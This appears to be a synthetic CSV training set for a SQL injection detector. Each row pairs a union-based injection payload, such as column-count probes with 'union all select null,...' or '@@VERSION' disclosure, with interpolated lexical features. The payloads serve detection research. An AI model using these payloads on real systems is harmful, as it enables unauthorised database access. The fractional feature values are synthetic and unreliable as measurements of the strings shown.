id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000084,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,0.637796007945074,61.19710737678972,20.0,3.6136358661827694,14.0,20.0,18.0,9.197107376789718,0.22877855545344894,0.3268265077906414,0.2941438570115772,0.15025107974433247,0.0,0.19710737678971868,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.0,3.0,0.0,0.19710737678971868,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000085,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000032,1.6650005557354326,58.543291273046755,16.0,3.161516281451549,43.6955275153645,1.0,4.0,9.84776375768225,0.7465815977512813,0.01712462808956025,0.06849851235824106,0.16779526180091742,1.0,0.0,0.8477637576822509,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.423881878841126,0.8477637576822508,1.0,0.0,0.42388187884112527,0.5761181211588747,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000086,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000037,1.032082445911938,76.49921063831448,20.0,3.403905144679736,14.0,39.69133617023321,9.615748936162548,13.192125531918727,0.18414385281037263,0.5144294077486603,0.12934071451240448,0.17208602492856256,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.2692914893604246,0.0,0.0,7.922834042558302,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000087,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000006,1.8907333030008957,74.3512201432548,32.3243899283726,4.3978637956608795,43.3512201432548,2.3243899283725984,17.0,11.675610071627402,0.5829932099435432,0.03134736152354983,0.22868114293418598,0.15697828559872098,0.0,0.0,2.0,0.0,1.675610071627401,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,6.351220143254801,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.32438992837259906,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.324389928372598
SMOTE_000088,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000063,1.7766711246143403,60.78830537528235,18.788305375282345,3.513041323512144,22.077964164784362,12.325934043454858,16.38440716704313,10.0,0.3673585300608741,0.19913663291103184,0.2689020633137211,0.164602773714373,0.0,1.0,2.596101791760782,0.0,0.0,0.0,0.0,2.5961017917607823,0.40389820823921796,0.0,3.4038982082392177,2.5961017917607823,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000089,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.8618527190748341,70.9817892102632,16.0,3.130599508336625,42.0,1.0,17.18543136821056,10.79635784205264,0.5921983526469623,0.014099960777308657,0.2416415532185785,0.15206013335715068,0.7963578420526394,0.20364215794736062,0.0,0.0,0.0,0.0,0.0,2.7963578420526396,0.0,0.0,6.0,0.0,0.7963578420526394,0.20364215794736062,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000090,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000010,0.8547986290845181,79.6328499877459,27.265699975491806,3.965056548938553,40.0,3.0,23.734300024508194,12.898549963237711,0.5023237342547727,0.037674280069107974,0.2981310842155854,0.1618709014605339,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.632849987745903,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000091,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,1.5144069296588734,65.6021334042098,16.0,3.1333163684651884,47.600948179648796,1.0,5.600948179648798,11.400237044912199,0.7268424921727794,0.01531073752743986,0.08379151602030584,0.17405525427947494,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.4002370449121996,0.5997629550878005,0.0,7.4002370449122,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.40023704491219964,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000092,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000004,0.8790196082308015,76.54928978145475,26.0,3.8462765575725255,40.81690340618175,3.0,24.18309659381825,8.549289781454753,0.533405026287503,0.0391992222944097,0.3159114567580401,0.11148429466004717,0.5492897814547529,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.0,0.1830965938182511,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000093,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000035,0.9174439810881371,60.262090554526644,20.526209055452664,3.580749950696716,14.0,32.209672443621315,4.0,10.052418110905329,0.23393866635989566,0.5326415241601192,0.06683961895997019,0.1665801905200149,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.052418110905329,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000094,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,1.0117788808123378,68.44787523025207,22.0,3.7628855490740665,40.97021441728689,9.0,10.985107208643447,7.492553604321723,0.5987530288498184,0.13241852442604313,0.15960140530853037,0.1092270414156081,0.7537231978391384,0.0,0.0,0.0,0.0,1.0,0.0,0.24627680216086156,0.0,0.0,4.492553604321723,1.0,0.7537231978391384,0.0,0.0,1.0,0.0,1.0,0.24627680216086156,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000095,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000045,0.6161046046737119,58.09570035316942,24.0,3.9239548941893236,19.0,18.476560282535537,14.0,6.619140070633884,0.33208674847495023,0.31060900224744176,0.24469549887627906,0.1126087504013289,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.6191400706338852,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000096,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,0.02195385217769949,70.0,19.924007330247207,3.7096491459268943,14.0,40.0,4.0,12.0,0.19999999999999998,0.5714285714285714,0.057142857142857134,0.17142857142857143,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000097,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,0.9341663964633611,67.98823789703538,18.758821577223465,3.6585093865072507,14.0,37.97647579407076,5.011762102964618,11.0,0.2060567824841705,0.5576025226108066,0.07443893723888903,0.16190175766613396,0.25294052574115483,0.0,3.0,0.0,0.0,0.0,0.0,0.252940525741155,0.0,0.0,7.4941189485176904,3.0,0.2529405257411549,0.0,1.0,0.0,0.0,0.0,0.2529405257411549,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,1.222454481763104,73.88294314844815,32.0,4.3775693018282205,44.0,2.0,17.0,10.88294314844815,0.5956439272088185,0.02707472396403726,0.23013515369431625,0.14714619513282803,0.0,0.0,2.0,0.0,1.4414715742240751,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.88294314844815,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000099,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,1.98265446160707,62.44882906348675,15.887792734128315,3.1758365874132863,36.22441453174337,1.0,16.22441453174337,9.0,0.5803959912963862,0.0160791982592772,0.2588120261108415,0.1447127843334951,0.0,0.4438963670641569,0.0,0.0,0.0,0.0,0.0,2.556103632935843,0.4438963670641568,0.0,4.556103632935843,0.0,0.0,0.4438963670641569,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000100,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,1.3416047303102747,63.421616181955166,18.0,3.5464721537183594,14.0,35.04143660618237,4.0,10.380179575772797,0.22176265059242214,0.5509648498909123,0.06336075731212061,0.16391174220454494,0.0,0.6198204242272037,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.760359151545593,3.0,0.0,0.6198204242272037,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000101,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,1.7549425292765908,67.30590858324554,21.029860217962227,3.7203667279045773,14.0,31.761118256302197,11.089580653886676,10.455209673056661,0.20995066013171526,0.4647953938051709,0.17062066896802167,0.15463327709509228,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.5149301089811127,0.0,0.0,5.940279564075549,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000102,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,0.9699589099172096,78.61733052829632,18.20577684276544,3.348915274731568,54.49940210900417,1.0,12.853187366880636,10.26474105241152,0.6899912670884525,0.0127542300191536,0.16603524363958708,0.1312192592528069,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5294821048230387,0.0,0.0,6.7352589475884805,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000103,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000001,1.6691493992588136,76.56278527145687,31.287442945708626,4.2297535286028,42.57488589141725,3.425114108582749,20.562785271456875,10.0,0.5569378500402804,0.044416536597054246,0.26791639887628815,0.1307292144863771,0.0,0.0,2.0,0.0,1.0,1.7125570542913748,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.7125570542913747,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.712557054291374
SMOTE_000104,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,0.2659973950549938,73.51356223324383,21.902712446648767,3.750415565710166,14.0,40.0,7.610849786595067,11.902712446648767,0.1905229394309805,0.5443512555170871,0.10323039293812854,0.1618954121138039,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9027124466487668,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.9027124466487668,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000105,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,2.1326987897392202,73.0,31.743896444287316,4.359215746424859,43.25610355571268,2.371948222143658,17.0,10.37194822214366,0.592549363776886,0.03249244139922822,0.2328767123287671,0.14208148249511862,0.0,0.0,2.0,0.0,1.6280517778563406,1.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.3719482221436594,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.37194822214366
SMOTE_000106,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000035,1.8488655476061722,69.40385423297872,20.510682863002366,3.641757887114262,14.0,37.95726854799054,5.957268547990538,11.489317136997634,0.20256674443623662,0.5473354892374536,0.08432578766891274,0.16577197865739718,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.4893171369976348,0.5106828630023652,0.0,7.489317136997634,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.4893171369976348,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000107,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,0.7891046607429324,59.0,21.80046109533487,3.953844338025012,14.0,28.0,8.0,9.0,0.23728813559322035,0.4745762711864407,0.13559322033898305,0.15254237288135594,0.19953890466512741,0.8004610953348724,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.0,1.0,0.19953890466512747,0.8004610953348724,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000108,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,0.7982246472747111,69.09094792075801,24.10390997169929,3.8996287600884774,32.79218005660142,12.311729915097878,15.766255954718869,8.220781994339859,0.4822160428994626,0.17249159907379502,0.22600371631076382,0.11928864171597851,0.0,1.0,2.2207819943398586,0.0,0.0,1.0,0.0,1.2207819943398586,0.0,0.0,2.779218005660142,3.220781994339858,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000109,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,1.282537476479831,71.65458355067356,21.53091671013471,3.6617593383740314,14.0,40.0,6.123666840538846,11.530916710134711,0.19562002160019004,0.5589143474291143,0.08458963529073368,0.160875995679962,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.5309167101347114,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.5309167101347114,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000110,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,0.5680355669875132,61.13232467381287,16.0,3.1498640650035883,45.421549782541916,1.0,4.0,10.710774891270956,0.743101714148101,0.016378938746021643,0.06551575498408654,0.1750035921217908,1.0,0.0,1.7107748912709557,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.855387445635477,1.7107748912709557,1.0,0.0,0.8553874456354779,0.14461255436452214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,0.09196153784755369,67.31193048060848,20.0,3.7737571404998023,14.0,28.38391443767197,13.85603208587301,11.071983957063495,0.20814048008796293,0.4210798906468255,0.20634088116137558,0.164438748103836,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.976005347645502,0.0,0.0,5.095978609417992,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000112,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000077,0.7338402003364247,56.65290575317354,21.65290575317354,3.758495169879182,14.0,21.388376987305843,12.264528765867697,9.0,0.24716405724260618,0.3783347282975956,0.21561003480383703,0.1588911796559611,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6529057531735392,1.0,0.0,3.347094246826461,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.8264528765867696,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000113,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000060,2.1442605517966604,65.4729958440539,22.472995844053898,3.8205136511295805,37.10801662378441,9.0,11.891983376215592,7.472995844053898,0.5670336229901829,0.13746923948799883,0.18141001422225514,0.11408712329956319,1.0,0.0,0.9459916881077957,0.0,0.0,1.0,0.0,0.47299584405389794,0.0,0.0,3.527004155946102,1.9459916881077957,1.0,0.0,0.4729958440538977,0.5270041559461023,0.0,1.0,0.47299584405389783,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000114,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,0.6722149364488429,78.81791633337592,27.0,4.132875107337474,29.0,24.0,15.0,10.817916333375925,0.36794554143656255,0.30450665498198276,0.19031665936373923,0.13723114421771548,3.0,0.0,2.6358326667518504,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,4.635832666751851,1.0,0.0,0.8179163333759252,0.18208366662407477,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000115,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,1.5326844870218665,72.60661046085377,22.26966947695731,3.8446544401073353,40.68528836868302,9.0,16.0,6.921322092170755,0.5561792710032837,0.12611417017071533,0.22420296919238275,0.09350358963361818,0.7303305230426886,0.2696694769573114,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.9213220921707546,1.0,0.7303305230426886,0.2696694769573114,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,1.6283622914119498,60.52386166836606,21.41268972193899,3.82227154481924,14.0,22.349241112244037,14.0,10.174620556122019,0.2318757829693331,0.3685406599918098,0.2318757829693331,0.16770777406952397,0.0,1.0,2.174620556122019,0.0,0.0,0.0,0.0,2.0,1.0,0.0,3.5873102780610098,2.1746205561220195,0.0,1.0,0.5873102780610095,0.41268972193899045,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
